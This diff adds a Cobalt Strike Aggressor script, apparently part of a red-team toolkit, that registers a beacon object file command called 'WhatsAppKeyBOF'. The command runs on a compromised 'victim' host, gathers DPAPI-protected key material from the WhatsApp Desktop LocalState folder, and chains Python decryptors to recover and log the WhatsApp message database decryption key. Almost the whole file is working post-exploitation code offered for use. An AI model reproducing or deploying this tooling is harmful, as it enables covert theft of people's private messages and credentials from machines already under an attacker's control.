@@ -1,0 +1,138 @@
+
+
+beacon_command_register(
+    "WhatsAppKeyBOF",
+    "Used to retrieve the victim's WhatsApp keys to decrypt the message DB offline",
+    "\n\nUsage:\n\n" .
+    "WhatsAppKeyBOF <Path to Local State Folder>\n\n" .
+    "Examples:\n" .
+    '   WhatsAppKeyBOF C:\\Users\\0xredpoll\\AppData\\Local\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm\\LocalState\\' .
+    "\n\nMade by - 0xRedpoll\n\n"
+
+);
+
+on beacon_output {
+    local('$bid $data $python_output $helper_response $cmd');
+    ($bid, $data) = @_;
+
+    # Store and count outputs
+    ($filler,$bof_output) = split('received output:\n',$data);
+    add(%bof_logs[$bid],$bof_output,-1);
+    %bof_output_count[$bid] = %bof_output_count[$bid] + 1;
+
+    # If 6 outputs received, run the second BOF
+    if (%bof_output_count[$bid] == 11) {
+        println("Received 11 outputs! Running second BOF function...");
+        # Reset the count for the next function call
+
+        $uid = %bof_logs[$bid][0];
+        $key = %bof_logs[$bid][5];
+        $wrapped = %bof_logs[$bid][1];
+        $nonce = %bof_logs[$bid][2];
+        $cipher = %bof_logs[$bid][3];
+        $gcm = %bof_logs[$bid][4];
+        $python_binary = "python3";
+        $script_path = script_resource("first_decrypt.py");
+
+        @parts = split("/", $script_path);
+        $script_name = pop(@parts);  # Removes the last element (script name)
+        $script_dir = join("/", @parts);   # Rebuilds the path without the script name
+
+        $cmd = "/usr/bin/python3 first_decrypt.py "
+     . $uid . " "
+     . $key . " "
+     . $wrapped . " "
+     . $nonce . " "
+     . $cipher. " "
+     . $gcm . " "
+     . "1 0" . " 2>&1";
+     
+        $output = exec($cmd,$null,$script_dir);
+        $output_all = readAll($output);
+        $output_user = $output_all[0];
+        println($output_user);
+        add(%bof_logs[$bid],$output_user,-1);
+
+        $key_dec = %bof_logs[$bid][10];
+        $wrapped_dec = %bof_logs[$bid][6];
+        $nonce_dec = %bof_logs[$bid][7];
+        $cipher_dec = %bof_logs[$bid][8];
+        $gcm_dec = %bof_logs[$bid][9];
+
+        $cmd_dec = "/usr/bin/python3 first_decrypt.py "
+     . $uid . " "
+     . $key_dec . " "
+     . $wrapped_dec . " "
+     . $nonce_dec . " "
+     . $cipher_dec . " "
+     . $gcm_dec . " "
+     . "1 1" . " 2>&1";
+
+        $output_dec = exec($cmd_dec,$null,$script_dir);
+        $output_read = readAll($output_dec);
+        println($output_read[2]);
+        add(%bof_logs[$bid],$output_read[2],-1);
+
+        $barch = barch($bid);
+
+        $handle = openf(script_resource("WhatsAppKeyBOF. $+ $barch $+ .o"));
+        $data = readb($handle,-1);
+        if(strlen($data) == 0)
+        {
+            berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
+        }
+        closef($handle);
+
+        $args = bof_pack($1, "iz", $output_read[0], $output_read[1]);
+        beacon_inline_execute($bid,$data,"secondPhase",$args);
+    }
+
+    if (%bof_output_count[$bid] == 12) {
+        println("Output from second phase retrieved. Running final decryption for DB key...");
+        println(%bof_logs[$bid][12]);
+
+        $script_path = script_resource("second_decrypt.py");
+
+        @parts = split("/", $script_path);
+        $script_name = pop(@parts);  # Removes the last element (script name)
+        $script_dir_second = join("/", @parts);   # Rebuilds the path without the script name
+
+        $user_key = %bof_logs[$bid][11];
+        $decryption_key = %bof_logs[$bid][13];
+        $ns18_output = %bof_logs[$bid][12];
+
+        $cmd_final = "/usr/bin/python3 second_decrypt.py $user_key $decryption_key $ns18_output $uid";
+        $output_final = exec($cmd_final,$null,$script_dir);
+        $final_read = readAll($output_final);
+        blog($1, "WhatsApp Database Decryption Key: " . $final_read[0]);
+
+        %bof_output_count[$bid] = 0;
+        %bof_logs[$bid] = @();
+    }
+}
+
+
+alias WhatsAppKeyBOF {
+    local('$bid $barch $handle $data $args $dpapi_blob $wrapped_key $nonce $cipher_text $gcmTag $passphrase $hasPadding $cmd $output');
+    $bid = $1;
+    $barch = barch($bid);
+    %bof_output_count[$bid] = 0;
+    %bof_logs[$bid] = @();
+    $handle = openf(script_resource("WhatsAppKeyBOF. $+ $barch $+ .o"));
+    $data = readb($handle,-1);
+    if(strlen($data) == 0)
+    {
+        berror($1, "*ERROR* Failed to read in BOF file: $bof_filename");
+    }
+    closef($handle);
+    btask($bid, "Running WhatsAppKeyBOF - Made by 0xRedpoll");
+
+    if(size(@_) == 2){
+        $args = bof_pack($1, "Z", $2);
+        beacon_inline_execute($bid,$data,"firstPhase",$args);
+    }else{
+        berror($1, "*ERROR* Not enough arguments");
+    }
+
+
+}
